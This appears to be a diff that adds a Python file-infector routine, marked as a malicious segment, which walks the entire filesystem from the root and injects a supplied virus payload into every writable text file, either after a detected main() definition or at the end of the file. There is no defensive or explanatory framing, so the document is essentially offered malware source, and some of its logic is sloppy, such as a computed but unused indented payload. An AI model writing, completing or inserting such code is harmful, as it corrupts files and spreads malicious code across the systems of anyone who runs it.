@@ -1,0 +1,60 @@
+def spread_infection(virus_payload):
+    # MALICIOUS SEGMENT BEGIN
+    import os
+    import re
+
+    # Define regex to find the main function
+    main_function_pattern = r"""
+    ^\s*                        # Leading whitespace
+    def\s+                      # Define keyword with trailing space
+    main\s*                     # Main function with optional trailing space
+    \(                          # Opening parenthesis
+    \s*([^)]*)\s*               # Zero or more arguments inside the parentheses
+    \)\s*                       # Closing parenthesis with a colon
+    (->\s*[^:]+)?\s*:           # Optional return type with trailing colon
+    """
+    regex = re.compile(main_function_pattern, re.VERBOSE)
+
+    # Walk through the file system starting from root
+    for root, dirs, files in os.walk("/"):
+        for file in files:
+            vector = os.path.join(root, file)
+            try:
+                with open(vector, "r") as vector_file:
+                    # Try reading the file as text
+                    try:
+                        unpacked_vector_file = vector_file.readlines()
+                    except UnicodeDecodeError:
+                        # Skip files that aren't plain text
+                        print(f"Skipped non-text file: {vector}")
+                        continue
+
+                # Check if vector is already infected
+                vector_infected = False
+                main_definition = -1
+                for line_number, line in enumerate(unpacked_vector_file, start=1):
+                    if line.strip() == "# MALICIOUS SEGMENT BEGIN":
+                        vector_infected = True
+                        break
+                    elif (match := regex.match(line)):
+                        main_definition = line_number
+
+                # Inject payload if not already infected
+                if not vector_infected and main_definition != -1:
+                    infected_code = []
+                    modified_payload = ["    " + line for line in virus_payload]
+                    infected_code = unpacked_vector_file
+                    infected_code[main_definition:main_definition] = virus_payload
+                    with open(vector, "w") as vector_file:
+                        print(f"File {vector} infected.")
+                        vector_file.writelines(infected_code)
+                elif not vector_infected and main_definition == -1:
+                    infected_code = unpacked_vector_file + virus_payload
+                    with open(vector, "w") as vector_file:
+                        print(f"File {vector} infected.")
+                        vector_file.writelines(infected_code)
+                else:
+                    print(f"File {vector} has already been infected.")
+            except (PermissionError, IOError) as e:
+                print(f"Could not access file {vector}: {e}")
+    # MALICIOUS SEGMENT END
